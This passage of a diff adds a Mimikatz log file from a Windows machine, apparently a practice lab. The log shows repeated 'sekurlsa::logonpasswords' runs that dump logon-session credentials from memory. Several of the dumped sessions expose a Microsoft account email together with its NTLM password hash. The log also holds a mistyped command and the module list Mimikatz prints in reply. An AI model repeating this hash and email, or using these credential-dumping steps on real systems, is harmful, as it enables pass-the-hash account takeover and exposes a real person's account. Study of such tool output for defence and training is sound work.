+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:08 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32749 (00000000:00007fed)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:07 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32715 (00000000:00007fcb)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:07 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 31585 (00000000:00007b61)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:06 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:06 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # skeurlsa::logonpasswords
+ERROR mimikatz_doLocal ; "skeurlsa" module not found !
+
+        standard  -  Standard module  [Basic commands (does not require module name)]
+          crypto  -  Crypto Module
+        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
+        kerberos  -  Kerberos package module  []
+       privilege  -  Privilege module
+         process  -  Process module
+         service  -  Service module
+         lsadump  -  LsaDump module
+              ts  -  Terminal Server module
+           event  -  Event module
+            misc  -  Miscellaneous module
+           token  -  Token manipulation module
+           vault  -  Windows Vault/Credential module
+     minesweeper  -  MineSweeper module
+             net  -  
+           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
+       busylight  -  BusyLight Module
+          sysenv  -  System Environment Value module
+             sid  -  Security Identifiers module
+             iis  -  IIS XML Config module
+             rpc  -  RPC control of mimikatz
+            sr98  -  RF module for SR98 device and T5577 target
+             rdm  -  RF module for RDM(830 AL) device
+             acr  -  ACR Module
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 344386 (00000000:00054142)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:09:22 PM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 344305 (00000000:000540f1)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:09:22 PM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 57573 (00000000:0000e0e5)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 57553 (00000000:0000e0d1)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:58 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:57 PM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33033 (00000000:00008109)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:57 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33043 (00000000:00008113)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:57 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32050 (00000000:00007d32)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:57 PM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/1/2025 3:08:57 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 304661 (00000000:0004a615)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:51 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 304592 (00000000:0004a5d0)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:51 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 57149 (00000000:0000df3d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:26 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 57122 (00000000:0000df22)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:26 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:26 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:25 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33130 (00000000:0000816a)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:25 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32997 (00000000:000080e5)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:25 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 31910 (00000000:00007ca6)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:24 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/4/2025 11:12:24 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
